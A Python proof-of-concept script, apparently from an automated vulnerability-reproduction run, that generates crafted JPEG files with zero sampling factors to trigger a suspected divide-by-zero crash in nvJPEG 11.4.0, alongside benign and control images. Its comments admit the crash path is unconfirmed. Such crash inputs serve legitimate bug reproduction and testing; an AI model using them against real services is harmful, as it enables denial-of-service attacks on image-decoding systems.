#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 假设：除零来自 JPEG SOF0 中分量的水平/垂直采样因子 H/V = 0。
# nvJPEG 在计算 MCU/块尺寸时很可能使用 max_h_samp_factor 或 max_v_samp_factor
# 作为分母的一部分（例如 max_samp * 8）。三分量图像中若所有分量采样因子均为 0，
# 则 max_h_samp_factor = max_v_samp_factor = 0，从而触发 CWE-369。
# ctrl 文件把 SOF0 中三分量的采样字节从 0x00 恢复为合法的 0x11。
#
# 不确定点：无法确认 nvJPEG 11.4.0 内部具体除法表达式；本 PoC 选择最典型的
# “采样因子为零导致 max sampling factor 为零”的路径。若内部另有校验，可能只返回错误。

import hashlib


def be16(n):
    return bytes(((n >> 8) & 0xFF, n & 0xFF))


def make_color_jpeg(width, height, h_samp, v_samp):
    out = bytearray()

    # SOI
    out += b'\xFF\xD8'

    # APP0 JFIF
    app0 = b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    out += b'\xFF\xE0' + be16(2 + len(app0)) + app0

    # DQT: one 8-bit table id 0, all ones
    dqt = b'\x00' + bytes([1]) * 64
    out += b'\xFF\xDB' + be16(2 + len(dqt)) + dqt

    # SOF0: 3 components, each using quant table 0.
    samp = ((h_samp & 0x0F) << 4) | (v_samp & 0x0F)
    sof = bytearray()
    sof.append(8)                 # precision
    sof += be16(height)
    sof += be16(width)
    sof.append(3)                 # Nf
    for cid in (1, 2, 3):
        sof.append(cid)           # component id
        sof.append(samp)          # H/V sampling factors
        sof.append(0)             # quant table id
    out += b'\xFF\xC0' + be16(2 + len(sof)) + bytes(sof)

    # DHT: custom DC table 0 and AC table 0.
    # DC: one code of length 1, symbol 0x00.
    # AC: one code of length 1, symbol 0x00 (EOB).
    dc_counts = bytes([1] + [0] * 15)
    ac_counts = bytes([1] + [0] * 15)
    dht = (b'\x00' + dc_counts + b'\x00' +
           b'\x10' + ac_counts + b'\x00')
    out += b'\xFF\xC4' + be16(2 + len(dht)) + dht

    # SOS: 3 components, all use DC0/AC0.
    sos = bytearray()
    sos.append(3)
    for cid in (1, 2, 3):
        sos.append(cid)
        sos.append(0x00)
    sos += bytes([0, 63, 0])      # Ss, Se, Ah/Al
    out += b'\xFF\xDA' + be16(2 + len(sos)) + bytes(sos)

    # Entropy data: every block is DC category 0 followed by AC EOB.
    # With the custom tables both symbols have 1-bit code 0, so we just need
    # 2 zero bits per block.  Size the stream assuming 1x1 sampling; the PoC
    # is expected to divide by zero before consuming entropy data.
    mcus = ((width + 7) // 8) * ((height + 7) // 8)
    blocks = mcus * 3
    total_bits = blocks * 2
    nbytes = (total_bits + 7) // 8
    ent = bytearray(nbytes)
    rem = total_bits % 8
    if rem:
        ent[-1] |= (1 << (8 - rem)) - 1
    out += ent

    # EOI
    out += b'\xFF\xD9'
    return bytes(out)


def write_and_report(role, filename, data):
    with open(filename, 'wb') as f:
        f.write(data)
    digest = hashlib.sha256(data).hexdigest()
    print(f"[F15_FILE] {role} {filename} {len(data)} {digest}")


if __name__ == '__main__':
    print("[F15_PLAN] Hypothesis: SOF0 H/V sampling factors = 0 make max sampling factor zero; nvJPEG divides by max_samp*8 when computing MCU/block dimensions; restoring sampling bytes to 0x11 avoids the zero denominator.")

    benign = make_color_jpeg(64, 64, 1, 1)
    poc = make_color_jpeg(64, 64, 0, 0)
    ctrl = make_color_jpeg(64, 64, 1, 1)

    write_and_report('benign', 'benign_color_64x64_samp_11.jpg', benign)
    write_and_report('poc', 'poc_sof_sampling_zero.jpg', poc)
    write_and_report('ctrl', 'ctrl_sof_sampling_11.jpg', ctrl)